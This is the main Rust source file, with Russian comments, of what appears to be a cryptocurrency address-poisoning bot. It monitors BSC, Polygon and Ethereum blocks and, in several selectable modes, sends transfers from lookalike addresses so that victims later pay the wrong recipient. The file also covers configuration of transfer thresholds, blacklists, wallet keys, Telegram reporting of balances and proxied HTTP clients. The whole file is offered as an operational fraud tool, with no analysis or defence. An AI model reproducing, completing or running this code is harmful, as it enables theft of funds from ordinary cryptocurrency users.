use crate::blockchain::{Blockchain, BlockchainBehivour};
use crate::polygon::checker;
use chrono::Local;
use ethers::prelude::LocalWallet;
use ethers::types::{Address, U256};
use lazy_static::lazy_static;
use serde::Deserialize;
use std::fs;
use std::str::FromStr;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;

mod blockchain;
mod bsc;
mod contracts;
mod db;
mod debank;
mod eth;
mod polygon;
mod telegram;
mod wallet;

// ваня пете
#[derive(Clone, Copy, Debug)]
pub enum Variant {
    AaBb,    // адресс подобный ване и отправить ване, адресс подобный пете и отправить пете
    AbBa,    // адресс подобный ване и отправить пете, адресс подобный пете и отправить ване
    All,     // все вместе.
    Default, // обычный. адресс подобный пете и отправить ване.
}

#[derive(Debug)]
pub struct Config {
    pub polygon_min_sum: U256,
    pub polygon_min_balance: U256,
    pub polygon_min_balance_stable: U256,
    pub polygon_min_sum_native: U256,
    pub polygon_max_transfers: AtomicUsize,
    pub polygon_black_list: Vec<Address>,
    pub polygon_transfer_sum: U256,
    pub polygon_transfer_sum_native: U256,
    pub polygon_default_wallet: LocalWallet,
    pub polygon_default_wallet_address: Address,
    pub polygon_rpc_wss_url: String,
    pub polygon_rpc_http_url: String,
    pub polygon_interval_send: u64,
    pub start_index: usize,
    pub end_index: usize,
    pub checker_min_sum: U256,
    pub checker_rpc_wss_url: String,
    pub checker_rpc_http_url: String,
    pub checker_bsc_rpc_wss_url: String,
    pub checker_bsc_rpc_http_url: String,
    pub checker_sleep: u64,
    pub checker_telegram_id: Vec<String>,
    pub checker_telegram_bot: String,
    pub bsc_min_sum: U256,
    pub bsc_min_balance: U256,
    pub bsc_min_balance_stable: U256,
    pub bsc_min_sum_native: U256,
    pub bsc_max_transfers: AtomicUsize,
    pub bsc_black_list: Vec<Address>,
    pub bsc_transfer_sum: U256,
    pub bsc_transfer_sum_native: U256,
    pub bsc_default_wallet: LocalWallet,
    pub bsc_default_wallet_address: Address,
    pub bsc_rpc_wss_url: String,
    pub bsc_rpc_http_url: String,
    pub bsc_interval_send: u64,
    pub eth_min_sum: U256,
    pub eth_min_balance_stable: U256,
    pub eth_max_transfers: AtomicUsize,
    pub eth_black_list: Vec<Address>,
    pub eth_transfer_sum: U256,
    pub eth_default_wallet: LocalWallet,
    pub eth_default_wallet_address: Address,
    pub eth_rpc_wss_url: String,
    pub eth_rpc_http_url: String,
    pub eth_interval_send: u64,
    pub eth_max_gwei: U256,
}

lazy_static! {
    pub static ref CONFIG: Config = {
        #[derive(Deserialize)]
        struct TempConfig {
            pub polygon_min_sum: u32,
            pub polygon_min_balance: f64,
            pub polygon_min_balance_stable: f64,
            pub polygon_min_sum_native: u32,
            pub polygon_max_transfers: i32,
            pub polygon_black_list: Vec<String>,
            pub polygon_transfer_sum: f64,
            pub polygon_transfer_sum_native: f64,
            pub polygon_default_wallet: String,
            pub polygon_default_wallet_address: String,
            pub polygon_rpc_wss_url: String,
            pub polygon_rpc_http_url: String,
            pub polygon_interval_send: u64,
            pub start_index: usize,
            pub end_index: usize,
            pub checker_min_sum: u32,
            pub checker_rpc_wss_url: String,
            pub checker_rpc_http_url: String,
            pub checker_bsc_rpc_wss_url: String,
            pub checker_bsc_rpc_http_url: String,
            pub checker_sleep: u64,
            pub checker_telegram_id: Vec<String>,
            pub checker_telegram_bot: String,
            pub bsc_min_sum: u32,
            pub bsc_min_balance: f64,
            pub bsc_min_balance_stable: f64,
            pub bsc_min_sum_native: u32,
            pub bsc_max_transfers: i32,
            pub bsc_black_list: Vec<String>,
            pub bsc_transfer_sum: f64,
            pub bsc_transfer_sum_native: f64,
            pub bsc_default_wallet: String,
            pub bsc_default_wallet_address: String,
            pub bsc_rpc_wss_url: String,
            pub bsc_rpc_http_url: String,
            pub bsc_interval_send: u64,
            pub eth_min_sum: i32,
            pub eth_min_balance_stable: f64,
            pub eth_max_transfers: i32,
            pub eth_black_list: Vec<String>,
            pub eth_transfer_sum: f64,
            pub eth_default_wallet: String,
            pub eth_default_wallet_address: String,
            pub eth_rpc_wss_url: String,
            pub eth_rpc_http_url: String,
            pub eth_interval_send: u64,
            pub eth_max_gwei: u64,
        }

        let config: TempConfig =
            toml::from_str(&*fs::read_to_string("config.toml").unwrap()).unwrap();
        Config {
            polygon_min_sum: U256::exp10(polygon::USDT_DECIMALS as usize)
                * U256::from(config.polygon_min_sum),
            polygon_min_balance: U256::from(
                (10_f64.powi(18_i32) * config.polygon_min_balance) as u128,
            ),
            polygon_min_balance_stable: U256::from(
                (10_f64.powi(polygon::USDT_DECIMALS as i32) * config.polygon_min_balance_stable)
                    as u128,
            ),
            polygon_min_sum_native: U256::exp10(18) * U256::from(config.polygon_min_sum_native),
            polygon_max_transfers: AtomicUsize::new(config.polygon_max_transfers as usize),
            polygon_black_list: config
                .polygon_black_list
                .into_iter()
                .map(|x| Address::from_str(&*x).unwrap())
                .collect::<Vec<Address>>(),
            polygon_transfer_sum: U256::from(
                (10_f64.powi(polygon::USDT_DECIMALS as i32) * config.polygon_transfer_sum) as u128,
            ),
            polygon_transfer_sum_native: U256::from(
                (10_f64.powi(18_i32) * config.polygon_transfer_sum_native) as u128,
            ),
            polygon_default_wallet: LocalWallet::from_str(&*config.polygon_default_wallet).unwrap(),
            polygon_default_wallet_address: Address::from_str(
                &*config.polygon_default_wallet_address,
            )
            .unwrap(),
            polygon_rpc_wss_url: config.polygon_rpc_wss_url,
            polygon_rpc_http_url: config.polygon_rpc_http_url,
            polygon_interval_send: config.polygon_interval_send,
            start_index: config.start_index,
            end_index: config.end_index,
            checker_min_sum: U256::from(config.checker_min_sum).pow(polygon::USDT_DECIMALS.into()),
            checker_rpc_wss_url: config.checker_rpc_wss_url,
            checker_rpc_http_url: config.checker_rpc_http_url,
            checker_bsc_rpc_wss_url: config.checker_bsc_rpc_wss_url,
            checker_bsc_rpc_http_url: config.checker_bsc_rpc_http_url,
            checker_sleep: config.checker_sleep,
            checker_telegram_id: config.checker_telegram_id,
            checker_telegram_bot: config.checker_telegram_bot,
            bsc_min_sum: U256::exp10(bsc::STABLE_DECIMALS as usize)
                * U256::from(config.bsc_min_sum),
            bsc_min_balance: U256::from((10_f64.powi(18_i32) * config.bsc_min_balance) as u128),
            bsc_min_balance_stable: U256::from(
                (10_f64.powi(18_i32) * config.bsc_min_balance_stable) as u128,
            ),
            bsc_min_sum_native: U256::exp10(18) * U256::from(config.bsc_min_sum_native),
            bsc_max_transfers: AtomicUsize::new(config.bsc_max_transfers as usize),
            bsc_black_list: config
                .bsc_black_list
                .into_iter()
                .map(|x| Address::from_str(&*x).unwrap())
                .collect::<Vec<Address>>(),
            bsc_transfer_sum: U256::from(
                (10_f64.powi(bsc::STABLE_DECIMALS as i32) * config.bsc_transfer_sum) as u128,
            ),
            bsc_transfer_sum_native: U256::from(
                (10_f64.powi(18_i32) * config.bsc_transfer_sum) as u128,
            ),
            bsc_default_wallet: LocalWallet::from_str(&*config.bsc_default_wallet).unwrap(),
            bsc_default_wallet_address: Address::from_str(&*config.bsc_default_wallet_address)
                .unwrap(),
            bsc_rpc_wss_url: config.bsc_rpc_wss_url,
            bsc_rpc_http_url: config.bsc_rpc_http_url,
            bsc_interval_send: config.bsc_interval_send,
            eth_min_sum: U256::exp10(eth::USDT_DECIMALS as usize) * U256::from(config.eth_min_sum),
            eth_min_balance_stable: U256::from(
                (10_f64.powi(18_i32) * config.eth_min_balance_stable) as u128,
            ),
            eth_max_transfers: AtomicUsize::new(config.eth_max_transfers as usize),
            eth_black_list: config
                .eth_black_list
                .into_iter()
                .map(|x| Address::from_str(&*x).unwrap())
                .collect::<Vec<Address>>(),
            eth_transfer_sum: U256::from(
                (10_f64.powi(eth::USDT_DECIMALS as i32) * config.eth_transfer_sum) as u128,
            ),
            eth_default_wallet: LocalWallet::from_str(&*config.eth_default_wallet).unwrap(),
            eth_default_wallet_address: Address::from_str(&*config.eth_default_wallet_address)
                .unwrap(),
            eth_rpc_wss_url: config.eth_rpc_wss_url,
            eth_rpc_http_url: config.eth_rpc_http_url,
            eth_interval_send: config.eth_interval_send,
            eth_max_gwei: U256::from((10_u128.pow(9) * config.eth_max_gwei as u128) as u128),
        }
    };
}

#[tokio::main()]
#[allow(unused_must_use)]
async fn main() {
    let mut choise = String::with_capacity(1);
    println!(
        "P.S. Ваня отправляет Пете: \n
    AaBb - адресс подобный ване и отправить ване, адресс подобный пете и отправить пете;\n
    AbBa - адресс подобный ване и отправить пете, адресс подобный пете и отправить ване;\n
    All - и то и то;\n
    Default - адресс подобный ване и отправить пете;\n
    Select \n\
    1. BSC(All) + POLYGON(All) + ETH(All) + Checker\n\
    2. Only checker with print wallet + balances\n\
    3. BSC(All) + POLYGON(All) + ETH(All)\n\
    4. BSC(All) + POLYGON(All)\n\
    6. ETH(All) + CHECKER\n\
    5. ETH(All)\n\
    7. ETH(AaBb)\n\
    8. ETH(AbBa) + POLYGON(AbBa) + BSC(AbBa) with matic and bnb\n\
    9. ETH(Default)\n\
    10. BSC(Default) + POLYGON(Default) + ETH(Default) + Checker\n\
    11. BSC(Default) + POLYGON(Default) + ETH(Default)\n\
    12. BSC(Default) + POLYGON(Default)\n\
    13. POLYGON(AbBa) with matic\n"
    );
    let _ = std::io::stdin().read_line(&mut choise).unwrap();

    let choise = choise.replace("\n", "");

    match &*choise {
        "1" => {
            futures::future::join5(
                Blockchain::Bsc.watch_blocks(Variant::All, false),
                Blockchain::Polygon.watch_blocks(Variant::All, false),
                Blockchain::Eth.watch_blocks(Variant::All, false),
                checker::checker(false),
                eth::checker_accounts(),
            )
            .await;
        }
        "2" => {
            futures::future::join(
                checker::checker(true),
                db::coingecko::coingecko::gecko_updater(),
            )
            .await;
        }
        "3" => {
            futures::future::join4(
                Blockchain::Bsc.watch_blocks(Variant::All, true),
                Blockchain::Polygon.watch_blocks(Variant::All, true),
                Blockchain::Eth.watch_blocks(Variant::All, true),
                eth::checker_accounts(),
            )
            .await;
        }
        "4" => {
            futures::future::join(
                Blockchain::Bsc.watch_blocks(Variant::All, true),
                Blockchain::Polygon.watch_blocks(Variant::All, true),
            )
            .await;
        }
        "5" => {
            futures::future::join3(
                Blockchain::Eth.watch_blocks(Variant::All, false),
                eth::checker_accounts(),
                checker::checker(true),
            )
            .await;
        }
        "6" => {
            futures::future::join(
                Blockchain::Eth.watch_blocks(Variant::All, false),
                eth::checker_accounts(),
            )
            .await;
        }
        "7" => {
            futures::future::join(
                Blockchain::Eth.watch_blocks(Variant::AaBb, false),
                eth::checker_accounts(),
            )
            .await;
        }
        "8" => {
            futures::future::join4(
                Blockchain::Eth.watch_blocks(Variant::AbBa, true),
                Blockchain::Polygon.watch_blocks(Variant::AbBa, true),
                Blockchain::Bsc.watch_blocks(Variant::AbBa, true),
                eth::checker_accounts(),
            )
            .await;
        }
        "9" => {
            futures::future::join(
                Blockchain::Eth.watch_blocks(Variant::Default, false),
                eth::checker_accounts(),
            )
            .await;
        }
        "10" => {
            futures::future::join5(
                Blockchain::Bsc.watch_blocks(Variant::Default, false),
                Blockchain::Polygon.watch_blocks(Variant::Default, false),
                Blockchain::Eth.watch_blocks(Variant::Default, false),
                checker::checker(false),
                eth::checker_accounts(),
            )
            .await;
        }
        "11" => {
            futures::future::join4(
                Blockchain::Bsc.watch_blocks(Variant::Default, true),
                Blockchain::Polygon.watch_blocks(Variant::Default, true),
                Blockchain::Eth.watch_blocks(Variant::Default, true),
                eth::checker_accounts(),
            )
            .await;
        }
        "12" => {
            futures::future::join(
                Blockchain::Bsc.watch_blocks(Variant::Default, false),
                Blockchain::Polygon.watch_blocks(Variant::Default, false),
            )
            .await;
        }
        "13" => Blockchain::Polygon
            .watch_blocks(Variant::Default, true)
            .await
            .unwrap(),
        _ => {
            panic!("Invalid number!");
        }
    }

    // futures::future::join3(
    //     Blockchain::Bsc.watch_blocks(),
    //     Blockchain::Polygon.watch_blocks(),
    //     checker::checker(false),
    // )
    // .await;
    // checker::checker(true).await;
}

#[allow(deprecated)]
async fn sleep(max_transactions: Arc<AtomicUsize>) {
    let now = Local::now();
    let tomorrow_midnight = (now + chrono::Duration::days(1)).date().and_hms(0, 0, 0);
    let duration = tomorrow_midnight
        .signed_duration_since(now)
        .to_std()
        .unwrap();
    tokio::time::sleep(duration).await;
    max_transactions.swap(0, Ordering::Relaxed);
}

trait ProxyClient: Send + Sync {
    fn create_with_proxy(proxy: Option<&str>) -> Self;
}

impl ProxyClient for reqwest::Client {
    fn create_with_proxy(proxy: Option<&str>) -> Self {
        match proxy {
            None => reqwest::Client::new(),
            Some(v) => {
                let proxy = v.split(":").collect::<Vec<_>>();
                reqwest::Client::builder()
                    .proxy(
                        reqwest::Proxy::all(format!("http://{}:{}", proxy[0], proxy[1]))
                            .unwrap()
                            .basic_auth(proxy[2], proxy[3]),
                    )
                    .build()
                    .unwrap()
            }
        }
    }
}
